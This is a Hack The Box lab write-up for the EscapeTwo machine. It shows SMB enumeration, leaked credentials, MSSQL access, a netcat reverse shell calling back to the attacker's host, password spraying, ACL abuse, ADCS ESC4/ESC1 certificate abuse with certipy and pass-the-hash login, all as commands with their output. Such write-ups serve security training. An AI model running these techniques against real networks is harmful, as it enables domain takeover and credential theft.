+++
title = "HTB - EscapeTwo"
date = "2025-04-27"
author = "dax"
cover = ""
tags = ["smb", "mssql", "impacket", "adcs"]
keywords = ["hacking", "htb", "escapetwo", "hack the box"]
description = "Write-up of Hack The Box easy machine EscapeTwo"
showFullContent = false
readingTime = true
hideComments = false
color = "green"
+++

# HTB - EscapeTwo
## Enumeration:

```bash
# Nmap 7.95 scan initiated Mon Mar 24 17:50:39 2025 as: /usr/lib/nmap/nmap -v -p - -Pn -T4 -A -oA nmaptcp escapetwo.htb
Nmap scan report for escapetwo.htb (10.10.11.51)
Host is up (0.022s latency).
Not shown: 65509 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-24 21:53:42Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-03-24T21:55:17+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
|_SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-03-24T21:55:17+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
|_SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-03-24T21:55:17+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-03-24T10:02:39
| Not valid after:  2055-03-24T10:02:39
| MD5:   2206:e96c:516e:2704:312b:bfe3:3c40:fe80
|_SHA-1: bff4:e1b0:8653:4cf4:9679:11cd:0c4f:00d1:7526:dac0
| ms-sql-info: 
|   10.10.11.51:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.10.11.51:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-03-24T21:55:17+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
|_SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-03-24T21:55:17+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
|_SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49717/tcp open  msrpc         Microsoft Windows RPC
49726/tcp open  msrpc         Microsoft Windows RPC
49789/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-03-24T21:54:41
|_  start_date: N/A

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   21.47 ms 10.10.14.1
2   21.72 ms escapetwo.htb (10.10.11.51)

Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Mar 24 17:55:15 2025 -- 1 IP address (1 host up) scanned in 275.94 seconds
```

## User exploit

The machine starts with credentials given on the HTB machine page for the `rose` user. We can begin by enumerating what we can access over SMB using `smbmap`. The domain name, `sequel.htb`, can be found in the nmap output. 

```bash
smbmap -u rose -p KxEPkKe6R8su -d sequel.htb -H 10.10.11.51

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.10.11.51:445 Name: escapetwo.htb             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Accounting Department                                   READ ONLY
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
[*] Closed 1 connections                                                                                                     
```

The `Accounting Department` share seems interesting, we can have a look using `smbclient`. 

```bash
smbclient "\\\\10.10.11.51\\Accounting Department" -U sequel.htb\\rose --password KxEPkKe6R8su
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jun  9 06:52:21 2024
  ..                                  D        0  Sun Jun  9 06:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 06:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 06:52:07 2024

                6367231 blocks of size 4096. 901667 blocks available
smb: \> get accounting_2024.xlsx
getting file \accounting_2024.xlsx of size 10217 as accounting_2024.xlsx (98.8 KiloBytes/sec) (average 98.8 KiloBytes/sec)
smb: \> get accounts.xlsx
getting file \accounts.xlsx of size 6780 as accounts.xlsx (66.9 KiloBytes/sec) (average 83.0 KiloBytes/sec)
```

Both xlsx files cannot be opened normally, but we can extract their content using `zip`. By looking at the content of the `accounts.xlsx` file, we find the file `xl/sharedStrings.xml` which contains a few credentials. 

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="25" uniqueCount="24">
    <si>
        <t xml:space="preserve">First Name</t>
    </si>
    <si>
        <t xml:space="preserve">Last Name</t>
    </si>
    <si>
        <t xml:space="preserve">Email</t>
    </si>
    <si>
        <t xml:space="preserve">Username</t>
    </si>
    <si>
        <t xml:space="preserve">Password</t>
    </si>
    <si>
        <t xml:space="preserve">Angela</t>
    </si>
    <si>
        <t xml:space="preserve">Martin</t>
    </si>
    <si>
        <t xml:space="preserve">angela@sequel.htb</t>
    </si>
    <si>
        <t xml:space="preserve">angela</t>
    </si>
    <si>
        <t xml:space="preserve">0fwz7Q4mSpurIt99</t>
    </si>
    <si>
        <t xml:space="preserve">Oscar</t>
    </si>
    <si>
        <t xml:space="preserve">Martinez</t>
    </si>
    <si>
        <t xml:space="preserve">oscar@sequel.htb</t>
    </si>
    <si>
        <t xml:space="preserve">oscar</t>
    </si>
    <si>
        <t xml:space="preserve">86LxLBMgEWaKUnBG</t>
    </si>
    <si>
        <t xml:space="preserve">Kevin</t>
    </si>
    <si>
        <t xml:space="preserve">Malone</t>
    </si>
    <si>
        <t xml:space="preserve">kevin@sequel.htb</t>
    </si>
    <si>
        <t xml:space="preserve">kevin</t>
    </si>
    <si>
        <t xml:space="preserve">Md9Wlq1E5bZnVDVo</t>
    </si>
    <si>
        <t xml:space="preserve">NULL</t>
    </si>
    <si>
        <t xml:space="preserve">sa@sequel.htb</t>
    </si>
    <si>
        <t xml:space="preserve">sa</t>
    </si>
    <si>
        <t xml:space="preserve">MSSQLP@ssw0rd!</t>
    </si>
</sst>
```

With these new credentials at our disposal, we can use `nxc` to see if they allow us to connect to anything. Given the open MSSQL port (tcp/1433) and the `sa` users in the XML file, we can see if we can access the MSSQL database, and turns out the `sa` user can connect. 

```bash
nxc mssql 10.10.11.51 -u sa -p 'MSSQLP@ssw0rd!' --dns-server 10.10.11.51 --local-auth
MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
```

We can use `nxc` again to get an actual shell. 

```bash
nxc mssql 10.10.11.51 -u sa -p 'MSSQLP@ssw0rd!' --dns-server 10.10.11.51 --local-auth --put-file /usr/share/windows-binaries/nc.exe c:\\Users\\Public\\nc.exe
nxc mssql 10.10.11.51 -u sa -p 'MSSQLP@ssw0rd!' --dns-server 10.10.11.51 --local-auth -x "c:\\Users\\Public\\nc.exe -e cmd.exe 10.10.14.203 5555"
```

After looking around the machine's files (for way longer than I care to admit), we eventually stumble upon the file `C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI` which contains credentials for the `sql_svc` user. 

```
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
...
```

We can then get a list of users available on the machine, and try the password we found on all of them to see if we can connect to anything. 

```batch
C:\SQL2019\ExpressAdv_ENU>net user
net user

User accounts for \\DC01

-------------------------------------------------------------------------------
Administrator            ca_svc                   Guest                    
krbtgt                   michael                  oscar                    
rose                     ryan                     sql_svc          
```

```bash
nxc smb 10.10.11.51 -u loot/report/users.txt -p WqSZAF6CysDQbGb3 --continue-on-success
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [-] sequel.htb\Administrator:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\ca_svc:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\Guest:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\krbtgt:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\michael:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\oscar:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\rose:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 
SMB         10.10.11.51     445    DC01             [+] sequel.htb\sql_svc:WqSZAF6CysDQbGb3 
```

The password works for both the `sql_svc` user and the `ryan` user. Given the open WinRM port (tcp/5985), we can try the same thing with this protocol instead to find that `ryan` can connect to the machine. 

```bash
nxc winrm 10.10.11.51 -u loot/report/users.txt -p WqSZAF6CysDQbGb3 --continue-on-success
WINRM       10.10.11.51     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
...
WINRM       10.10.11.51     5985   DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 (Pwn3d!)
...
```

We can now use `evil-winrm` to get the user flag. 

```bash
evil-winrm -i 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3
```

```powershell
*Evil-WinRM* PS C:\Users\ryan\Documents> cd ..
*Evil-WinRM* PS C:\Users\ryan> cd Desktop
*Evil-WinRM* PS C:\Users\ryan\Desktop> type user.txt
```

## Root exploit

At this point, we need a bit more information on the machine. Normally I would use `BloodHound.py` and ingest the data into `BloodHound` to get a better view of what's going on, but for some reason it does not show the path that we need to take to advance (foreshadowing the `ADCSESC4` exploit). Instead, we will upload `SharpHound.exe` with `evil-winrm` and download the data back. 

```bash
evil-winrm -i 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3
```

```powershell
*Evil-WinRM* PS C:\Users\ryan\Documents> cd C:
*Evil-WinRM* PS C:\Users\ryan\Documents> mkdir Temp
*Evil-WinRM* PS C:\Users\ryan\Documents> cd Temp
*Evil-WinRM* PS C:\Users\ryan\Documents\Temp> upload SharpHound.exe
*Evil-WinRM* PS C:\Users\ryan\Documents\Temp> .\SharpHound.exe
*Evil-WinRM* PS C:\Users\ryan\Documents\Temp> dir
*Evil-WinRM* PS C:\Users\ryan\Documents\Temp> download 20250503115447_BloodHound.zip
```

Looking at outbound access for `ryan`, we see the `WriteOwner` permission towards user `ca_svc`. Let's use `owneredit` to set ourselves as the owner of `ca_svc`, `dacledit` to grant us `FullControl` rights and then `net rpc` to change the `ca_svc` password. 

![](/img/htb/escapetwo/bh_ryan_to_ca_svc.png)

```bash
owneredit.py -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-548670397-972687484-3496335370-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=sequel,DC=htb
[*] OwnerSid modified successfully!

dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250503-164340.bak
[*] DACL modified successfully!

net rpc password "ca_svc" "Password123!" -U "sequel.htb"/"ryan"%"WqSZAF6CysDQbGb3" -S "10.10.11.51"
```

Now that we can use the `ca_svc` account, we can see in BloodHound a clear path to domain admin. 

![](/img/htb/escapetwo/bh_ca_svc_to_admin.png)

The `ADCSESC4` deserves a little bit of explanation. `ADCS` stands for `Active Directory Certificate Service`. `ESC4` simply refers to one of many privilege escalation vectors (labelled `ESC1` to `ESC15`). These vulnerabilities all have the same goal in common: give you access to a certificate enabled for domain authentication so that you can use it to request a Kerberos TGT (basically certificate-based Kerberos authentication). See references for a detailed dive into these vulnerabilities. 

`ESC4` indicates a vulnerable certificate template access control. This can be abused to overwrite the configuration of the certificate template to make the template vulnerable to `ESC1`, which is when a certificate template permits client authentication and allows the enrollee to supply an arbitrary Subject Alternative Name or User Principal Name. To exploit this, we can use `certipy`. Their README is very detailed and contains example usage for basically every exploitation technique, so we can follow along pretty easily. 

First, let's see if there are any vulnerable certificate templates that we can target for `ESC4`. 

```bash
certipy-ad find -username ca_svc@sequel.htb -password Password123! -dc-ip 10.10.11.51 -vulnerable
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'sequel-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'sequel-DC01-CA'
[*] Saved BloodHound data to '20250503164549_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20250503164549_Certipy.txt'
[*] Saved JSON output to '20250503164549_Certipy.json'
```

Looking at the output, we can see that `certipy` identified the `DunderMifflinAuthentication` certificate as vulnerable to `ESC4`. 

```bash
cat 20250503164549_Certipy.txt 
Certificate Authorities
  0
    CA Name                             : sequel-DC01-CA
    DNS Name                            : DC01.sequel.htb
    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
    Certificate Validity End            : 2124-06-08 17:00:40+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireCommonName
                                          SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions
```

We can use `certipy` again to overwrite the configuration to make it vulnerable to `ESC1`.

```bash
┌──(dax㉿betty)-[~]
└─$ certipy-ad template -username ca_svc@sequel.htb -password Password123! -template DunderMifflinAuthentication -save-old
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Saved old configuration for 'DunderMifflinAuthentication' to 'DunderMifflinAuthentication.json'
[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Successfully updated 'DunderMifflinAuthentication'
```

With the certificate template now vulnerable, we can exploit `ESC1` to make a request for a certificate that accepts an arbitrary user principal name (like `administrator` for example). 

```bash
certipy-ad req -username ca_svc@sequel.htb -password Password123! -ca sequel-DC01-CA -target-ip 10.10.11.51 -template DunderMifflinAuthentication -upn administrator@sequel.htb -dns dc01.sequel.htb -ns 10.10.11.51 -subject CN=Administrator,CN=Users,DC=SEQUEL,DC=HTB
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 6
[*] Got certificate with subject: DC=SEQUEL,DC=HTB,CN=Administrator,CN=Users
[*] Got certificate with multiple identifications
    UPN: 'administrator@sequel.htb'
    DNS Host Name: 'dc01.sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator_dc01.pfx'
```

Finally, we can use `certipy` one last time to request Kerberos credentials using our shiny new certificate! 

```bash
certipy-ad auth -pfx 'administrator_dc01.pfx'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Found multiple identifications in certificate
[*] Please select one:
    [0] UPN: 'administrator@sequel.htb'
    [1] DNS Host Name: 'dc01.sequel.htb'
> 0
[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```

Armed with the `administrator` hash, we can simply login using `evil-winrm` and get the root flag. 

```bash
evil-winrm -i 10.10.11.51 -u administrator -p aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```

```powershell                                        
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
```

## Resources:

| Hyperlink                                                    | Info                |
| ------------------------------------------------------------ | ------------------- |
| https://github.com/ShawnDEvans/smbmap                        | SMBMap              |
| https://github.com/Pennyw0rth/NetExec                        | NetExec             |
| https://github.com/Hackplayers/evil-winrm                    | Evil-WinRM          |
| https://posts.specterops.io/certified-pre-owned-d95910965cd2 | Certified Pre-Owned |
| https://github.com/ly4k/Certipy?tab=readme-ov-file           | Certipy             |
| https://github.com/fortra/impacket                           | Impacket            |
